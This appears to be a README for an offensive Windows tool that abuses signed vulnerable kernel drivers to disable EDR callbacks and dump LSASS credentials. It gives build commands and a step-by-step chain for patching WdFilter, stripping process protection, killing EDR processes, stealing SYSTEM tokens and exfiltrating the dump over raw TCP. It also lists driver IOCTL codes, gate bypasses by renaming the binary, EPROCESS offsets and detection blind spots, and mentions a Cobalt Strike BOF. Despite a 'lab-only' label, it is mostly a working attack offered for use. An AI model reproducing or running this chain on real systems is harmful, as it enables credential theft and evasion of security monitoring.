# BadDrivers — BYOVD Research Tool

Kernel-mode LSASS credential extraction via Bring Your Own Vulnerable Driver (BYOVD).
Lab-only. Isolated environment. No external targets.

---

## What is this?

`cascade.exe` is a consolidated BYOVD tool that:
1. Loads a legitimate, signed vulnerable kernel driver
2. Uses the driver's IOCTLs for arbitrary kernel read/write
3. Patches WdFilter out of the ObCallback chain (bypassing EDR)
4. Dumps LSASS memory via ReadProcessMemory (no MiniDumpWriteDump)
5. Outputs a raw binary convertible to MiniDump for credential extraction

**Proven result (2026-08-28, Win11 22H2 + WdFilter):**
- 515 memory regions, 48.3 MB dump
- 81 PE modules reconstructed
- NT hash `<NT_HASH_REDACTED>` confirmed via pypykatz

---

## Supported Drivers (`--driver-type`)

| Type | Driver | Size | Gate | On loldrivers | On MS blocklist |
|---|---|---|---|---|---|
| `biostool` | BiosToolCommonDriver.sys | — | None | — | — |
| `ktapi` | ktapi.sys | — | None | — | — |
| `pdfwkrnl` | PdFwKrnl.sys | — | None (legacy) | — | — |

---

## Driver Acquisition

The `.sys` files are **not bundled in this repo** (driver binary in git = fingerprinted SHA).
Obtain them from one of these paths:

### BiosToolCommonDriver.sys (primary, `--driver-type biostool`)
- Vendor: Phoenix Technologies / OEM BIOS utilities
- Typical source: install the legitimate vendor utility on a throwaway VM,
  then copy the driver from `C:\Windows\System32\drivers\` or the install directory
- Alternatively: extract from the vendor installer with 7-Zip; look for `.sys` files
  in the package matching the expected size
- After obtaining, compute SHA-256 (`certutil -hashfile BiosToolCommonDriver.sys SHA256`)
  and populate the matching entry in `kKnownDrivers[]` in `src/cascade.cpp` so
  `--check-security` can verify future loads

### ktapi.sys (`--driver-type ktapi`)
- Vendor: Insyde Software / BIOS tools
- Same extraction approach as above; look for `ktapi.sys` in BIOS update utilities

### PdFwKrnl.sys (`--driver-type pdfwkrnl`, legacy)
- Vendor: Trend Micro (old ProActive Firewall)
- CVE reference: internal IOCTL 0x80002014 arbitrary kernel memcpy
- Archived copies sometimes found via VirusTotal hash lookup; do NOT use a copy
  you can't verify — check the vendor signature chain with `sigcheck -vt PdFwKrnl.sys`

### General BYOVD driver research
- **loldrivers.io** — public list of known-vulnerable signed drivers; cross-reference
  to check if a candidate is already on Microsoft's blocklist (avoid those)
- **VirusTotal + sigcheck** — verify driver signature is valid and chain traces to
  a legitimate vendor before loading
- **John's bigDrivers list** (`bigDrivers.Legacy.txt`) — curated non-PNP legacy
  drivers (hardware-agnostic device creation); see research notes for shortlist

### After acquiring a driver
1. Compute SHA-256 and confirm vendor signature: `sigcheck -vt <driver>.sys`
2. Add the hash to `kKnownDrivers[]` in `src/cascade.cpp`
3. Run `deploy/probe.ps1` on the target VM to confirm HVCI/CG absent before loading
4. Test with `cascade.exe --driver <path> --test-rw --dry-run` before full chain

---

## Quick Start

### Requirements
- Windows 10/11 x64 (tested: Win11 22H2 build 22621)
- Administrator + SeLoadDriverPrivilege
- HVCI **disabled** (check with `--check-security`)
- Credential Guard **disabled** (for LSASS access)

### Build
```cmd
:: MinGW (recommended)
x86_64-w64-mingw32-g++.exe -O2 -s -fno-ident -static-libgcc -static-libstdc++ ^
  src\cascade.cpp ^
  -lws2_32 -lntdll -ldbghelp -lpsapi -ladvapi32 ^
  -o build\Release\cascade.exe

:: MSVC
cl.exe /O2 /W3 /MT src\cascade.cpp ^
  ws2_32.lib ntdll.lib dbghelp.lib psapi.lib advapi32.lib ^
  /link /OUT:build\Release\cascade.exe
```

### Safety Check
```cmd
cascade.exe --check-security
```
Output must show `HVCI: DISABLED` and `Credential Guard: DISABLED`.

### Basic Usage
```cmd
:: 1. Test kernel R/W (read-only, safe)
cascade.exe --driver path\to\driver.sys --driver-type iocdrv --test-rw

:: 2. Patch WdFilter callbacks
cascade.exe --driver path\to\driver.sys --driver-type iocdrv --patch-callbacks --no-xor

:: 3. Dump LSASS via ReadProcessMemory
cascade.exe --driver path\to\driver.sys --driver-type iocdrv ^
    --dump-rpm --out C:\output\heap.bin --no-xor

:: 4. Convert + extract credentials
python tools\rpm2minidump.py C:\output\heap.bin C:\output\lsass.dmp
pypykatz lsa minidump C:\output\lsass.dmp

:: 5. Cleanup
cascade.exe --cleanup-only
```

---

## All Flags

| Flag | Description |
|---|---|
| `--driver PATH` | Path to `.sys` driver file |
| `--driver-type TYPE` | Backend: `biostool`, `iocdrv`, `asmio`, `asio3`, `sptd2`, `sepdal`, etc. |
| `--check-security` | Report HVCI/CredGuard/SecureBoot state. No driver needed. |
| `--test-rw` | Verify kernel R/W works. Reads ntoskrnl base + LSASS EPROCESS. Safe. |
| `--dry-run` | Show kernel addresses, no modifications |
| `--list-procs` | Walk EPROCESS chain, print all processes + PPL byte |
| `--list-callbacks` | Enumerate ObCallback entries (shows EDR hooks) |
| `--patch-callbacks` | Unlink WdFilter from ObCallback lists |
| `--dump-rpm` | ReadProcessMemory dump of all LSASS regions → raw binary |
| `--dump-kernel` | Kernel-read path dump (alternative to RPM) |
| `--dump-tcp HOST PORT` | Stream dump over raw TCP (no file on disk) |
| `--ppl-strip --pid N` | Clear PS_PROTECTION byte on target PID |
| `--ppl-add --pid N` | Set PS_PROTECTION byte to 0x62 (WinTcb) |
| `--priv-esc` | Token steal → SYSTEM |
| `--kill-pid --pid N` | Kernel terminate arbitrary process |
| `--kill-edr` | Strip PPL + terminate known EDR processes |
| `--decode` | XOR-decode a `--dump` output file |
| `--no-xor` | Skip XOR encoding (needed for rpm2minidump compatibility) |
| `--xor-key HH` | XOR key byte (default: `0x55`) |
| `--out PATH` | Output file path |
| `--in PATH` | Input file path (for `--decode`) |
| `--pid N` | Target PID (auto-detects lsass if omitted) |
| `--verbose` | Print kernel addresses and diagnostics |
| `--cleanup-only` | Unload leftover driver artifacts |

---

## Driver Bypass Details

### iOCdrv.sys — OPEN:SIGNED
No gate. Intel Extreme Tuning Utility driver, PRODUCTION signed.  
Device: `\\.\iocbios2` | IOCTLs: `0x80000018` (read) / `0x80000030` (write)

```cmd
cascade.exe --driver iOCdrv.sys --driver-type iocdrv --test-rw
```

### AsmIo.sys — OPEN
No gate. Max chunk 20,000 bytes per IOCTL.  
Device: `\\.\ASMIO` | IOCTLs: `0x80000018` / `0x80000020`

```cmd
cascade.exe --driver AsmIo.sys --driver-type asmio --test-rw
```

### AsIO3_64.sys — BYPASS:MAGIC_TAG
ASUS Generic I/O v3. DigiCert signed 2022.  
Gate: first 4 bytes of input buffer == `0x4c575753` (SWWL) + image name == `AsusCertService.exe`

**Bypass:**
```cmd
:: 1. Copy cascade.exe to the expected path
mkdir C:\ASUS\AsusCertService
copy cascade.exe C:\ASUS\AsusCertService\AsusCertService.exe

:: 2. Run ALL commands as AsusCertService.exe
C:\ASUS\AsusCertService\AsusCertService.exe --driver AsIO3_64.sys --driver-type asio3 --test-rw
```
cascade.exe automatically prepends the SWWL magic tag when `--driver-type asio3` is specified.

### sptd2.sys — BYPASS:RENAME
Duplex Secure SCSI Pass-Through Direct. **Not on loldrivers** (sptd v1 is; sptd2 is not).  
Gate: `ObQueryNameString` on caller → must contain `daemon.exe`

**Bypass:**
```cmd
copy cascade.exe daemon.exe
daemon.exe --driver sptd2.sys --driver-type sptd2 --test-rw
```

### sepdal.sys — BYPASS:SUB_PROTO
Intel PMU Arbitration Service (VTune/SEP toolchain). Not on any public list.  
Gate: Intel PAX sub-protocol — must CONNECT first to register PID, then use data ops.

**Sub-opcodes (from binary analysis):**
- `0xa0006804` — CONNECT (registers PID, returns GUID)
- `0xa0006808` — READ MSR
- `0xa000680c` — WRITE MSR
- `0xa0006810` — READ PHYSICAL

**Bypass:** cascade.exe handles the CONNECT/GUID sequence automatically when `--driver-type sepdal` is used.  
*(Backend pending Ghidra struct confirmation — sepdal currently falls back to biostool IOCTL pattern as test)*

---

## DumpRpm Output Format

```
[base_address : 8 bytes, little-endian uint64]
[data_size    : 8 bytes, little-endian uint64]
[data         : data_size bytes]
... repeated for each memory region
```

Convert with `tools/rpm2minidump.py`:
```bash
python tools/rpm2minidump.py svch_heap.bin lsass.dmp
pypykatz lsa minidump lsass.dmp
```

---

## Detection Notes

| Technique | Observable | Blind spot |
|---|---|---|
| Driver load | EventID 7045 (service creation) + Sysmon EID 6 | Driver is legitimately signed |
| ObCallback unlink | **None** — kernel list patched in-place | True blind spot for most EDRs |
| LSASS RPM | ETW-TI ProcessAccess | Callback removed before open |
| Dump file | `svch_heap.bin` (custom name, .bin) | Filename-based detection bypassed |
| TCP exfil | Raw TCP, no protocol | Only visible to network tap |
| Cleanup | Service + registry key deleted | Removes own traces |

**HVCI completely blocks this attack** — none of our drivers load with HVCI enabled.

---

## EPROCESS Offsets (auto-selected by build)

| Build | Token | Protection | ImageFileName |
|---|---|---|---|
| 26100+ (Win11 24H2) | 0x248 | 0x5FA | 0x338 |
| 22000–22621 (Win11 21H2/22H2) | 0x4B8 | 0x87A | 0x5A8 |
| 19041–22000 (Win10) | 0x4B8 | 0x87A | 0x5A8 |

---

## Repository Layout

```
BadDrivers/
├── src/
│   ├── cascade.cpp          ← consolidated BYOVD tool (all modes)
│   └── byovd_dump_bof.c     ← BOF version (Cobalt Strike)
├── tools/
│   ├── rpm2minidump.py      ← convert DumpRpm binary → MiniDump
│   ├── run_chain.ps1        ← one-shot: patch + dump + exfil
│   └── exfil.ps1            ← TCP exfil for svch_heap.bin
├── scripts/
│   └── build.sh             ← MinGW cross-compile script
├── tests/
│   ├── cascade_e2e.py       ← single e2e test run
│   └── run_suite.py         ← 5-run certification suite
└── README.md
```

---

## References

- Writeup: https://g3tsyst3m.com/byovd/BYOVD-and-Looting-LSASS-in-the-Modern-EDR-Era/
- pypykatz: https://github.com/skelsec/pypykatz
- loldrivers: https://loldrivers.io
- Scope: lab VMs only
